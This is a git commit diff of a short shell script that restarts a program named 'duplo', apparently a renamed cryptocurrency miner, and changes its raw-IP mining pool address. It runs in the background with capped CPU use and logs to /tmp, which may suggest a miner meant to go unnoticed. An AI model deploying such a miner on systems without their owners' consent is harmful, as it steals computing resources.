4923332fde5797d5706c969063f6307468e601e3
norog <47349251+norog@users.noreply.github.com>
2019-02-12 08:33:17 -0800

    Update 40.sh

--- 40.sh
+++ 40.sh
@@ -1,3 +1,3 @@
 pkill duplo
-duplo -o 94.130.186.161:55889 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=44 --av=1 --variant -1
+duplo -o 95.216.147.27:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=44 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
